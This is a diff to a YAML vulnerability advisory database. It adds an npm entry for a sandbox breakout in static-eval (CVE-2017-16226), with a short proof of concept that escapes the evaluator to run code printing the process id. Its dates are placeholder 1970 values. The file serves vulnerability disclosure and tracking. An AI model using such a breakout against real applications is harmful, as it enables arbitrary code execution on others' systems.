@@ -1,5 +1,33 @@
 ---
-- id: snykio:npm:static-eval:CVE-2017-16226
+- id: npmjs:npm:static-eval:548
+  title: Sandbox Breakout / Arbitrary Code Execution
+  description: |-
+    Affected versions of `static-eval` pass untrusted user input directly to the global function constructor, resulting in an arbitrary code execution vulnerability when user input is parsed via the package.
+
+    ## Proof of concept
+    ```
+    var evaluate = require('static-eval');
+    var parse = require('esprima').parse;
+    var src = '(function(){console.log(process.pid)})()';
+    var ast = parse(src).body[0].expression;
+    var res = evaluate(ast, {});
+    // Will print the process id
+    ```
+  affected_package: static-eval
+  vulnerable_versions:
+  - "<=1.1.1"
+  severity: moderate
+  package_manager: npm
+  cve:
+  - CVE-2017-16226
+  cwe: CWE-20
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Matt Austin
+  references: https://npmjs.com/advisories/548
+  source_url: https://npmjs.com/advisories/548
+- id: snykio:npm:static-eval:20171016
   title: Arbitrary Code Execution
   description: |
     [`static-eval`][1] is a module to evaluate statically-analyzable
